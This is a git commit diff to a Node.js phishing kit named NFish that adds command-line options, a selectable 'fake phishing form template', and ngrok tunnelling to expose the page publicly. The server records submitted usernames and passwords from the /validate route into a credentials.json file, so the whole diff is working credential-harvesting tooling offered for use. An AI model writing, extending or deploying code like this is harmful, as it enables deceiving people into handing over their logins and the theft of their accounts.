a3df127d7004ae6f0d7a76f35682fecfd0df4112
ADITYA <adityamishra081@protonmail.com>
2021-12-07 22:05:26 +0000

    Added NGROK Tunneling
    Added Argument Parser.
    Removed Unused Shit.
    Added File Existence Detection
    Added Error Handling
    Added NGROK Support

--- src/index.js
+++ src/index.js
@@ -1,10 +1,73 @@
 const path = require('path');
 const fs = require('fs')
+
 const express = require('express');
-const session = require('express-session');
 const bodyParser = require('body-parser');
+
+const connectToWorld = require('./ngrokHandler');
+const credentialFile = path.resolve(path.join(__dirname, '../output/credentials.json'))
+
+const process = require('process')
+const { Command } = require('commander');
 const { exit } = require('process');
-const credentialFile = path.join(__dirname, '../output/credentials.json')
+var { version, description } = require(path.join(__dirname, '../package.json'));
+version += "-stable"
+
+const program = new Command();
+program.name("NFish@"+version)
+program.description(description)
+
+program.option('--no-tunnel', "Don't use default NGROK service for tunneling (Default false)")
+program.option('-p, --port <int>', 'Port number, which server will use (Default 8080).')
+program.option('-t, --template <str>', 'Fake phishing form template to use (Default template/index.html).')
+program.option('-v, --version', 'Show Program Version.')
+
+var args = program.parse(process.argv).opts()
+args.tunnel = !args.tunnel // Flip the value because it is by default true.
+
+if (args.help) {
+	program.help();
+} else if (args.version) {
+	console.log(version);
+}
+
+if (args.port) {
+	args.port = parseInt(args.port)
+	if (args.port == NaN) {
+		args.port = 8080
+	}
+} else {
+	args.port = 8080
+}
+
+const server = require('http')
+	.createServer()
+	.listen(args.port, () => {
+		server.close()
+	})
+	.on('error', () => {
+		console.error("Error: Port " + args.port + " is in Use...");
+		exit(1)
+	})
+
+if (args.template) {
+	fs.stat(path.resolve(args.template), function(err, stat) {
+		if (err == null) {
+			args.template = path.resolve(args.template)
+		} else if (err.code === 'ENOENT') {
+			console.log("Error: Template Doesn't Exists...");
+			program.help()
+			exit(1)
+		} else {
+			console.log('Unknown Error Occured: ' + err.code);
+			console.log(err.message);
+			console.log('You Can Report this error at https://github.com/DEVLOPRR/NFish/issues/new');
+			exit(1)
+		}
+	});
+} else {
+	args.template = path.resolve(path.join(__dirname, "../template/index.html"))
+}
 
 async function addJSON(data={}) {
 	let jsonFile = fs.readFileSync(credentialFile, { encoding: 'utf-8' })
@@ -17,17 +80,11 @@ async function addJSON(data={}) {
 
 const app = express();
 
-app.use(session({
-	secret: 'secret',
-	resave: true,
-	saveUninitialized: true
-}));
-
 app.use(bodyParser.urlencoded({extended : true}));
 app.use(bodyParser.json());
 
 app.get('/', function(request, response) {
-	response.sendFile(path.join(__dirname, '../public/index.html'));
+	response.sendFile(args.template);
 });
 
 app.post('/validate', function(request, response) {
@@ -40,14 +97,20 @@ app.post('/validate', function(request, response) {
 			usrname: username,
 			passwd: password
 		})
-		response.redirect('/?valid=' + encodeURIComponent('true'))
+		response.redirect('/?valid=true')
 		response.end();
 	} else {
-		response.send('Please enter Username and Password!');
-		response.redirect('/?valid=' + encodeURIComponent('false'))
+		response.redirect('/?valid=false')
 		response.end();
 	}
 });
 
-console.log("Listening on port 8080, URL: http://127.0.0.1:8080");
-app.listen(8080);
+app.listen(args.port, '127.0.0.1', () => {
+	console.log("Server Started on http://127.0.0.1:" + args.port + " ...")
+	if (args.tunnel == true) { // if args.tunnel is true, which can only be if user doesn't want to use NGROK
+		console.log("Not Using NGROK Service...");
+	} else {
+		console.log("Starting NGROK Service...");
+		connectToWorld(args.port)
+	}
+});
